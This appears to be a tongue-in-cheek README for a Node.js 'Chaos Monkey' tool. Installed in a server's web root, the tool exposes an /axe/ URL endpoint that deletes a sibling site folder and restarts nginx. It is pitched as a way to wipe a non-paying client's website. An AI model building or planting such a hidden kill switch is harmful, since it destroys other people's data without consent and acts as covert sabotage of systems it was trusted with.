# Chaos Monkey

Have you ever wanted a quick way to delete your non-paying client’s website 
with a simple URL?

Use like:

    $ cd /var/www
    $ git clone {{thisRepo}}
    $ cd {{thisRepo}}
    $ npm install
    $ node start server/www.js

Now you can get an endpoint:

    $ http://{{domain}}/axe/{{toBeDeleted}}

Such that any common folder at the same place as `chaos_monkey` will be 
deleted.

## Expected Results

1. Client doesn’t pay. *snaps fingers*
2. Hit the common folder endpoint.
3. App is deleted, `nginx` server is restarted.
4. App shows a Critical Error!
5. Client scrambles for a fix, finds a dev to remove the proxy.
6. Client sees that site now redirects to [dowebsitesneedtolookexactlythesameineverybrowser.com](http://dowebsitesneedtolookexactlythesameineverybrowser.com/).
7. Nobody wins.
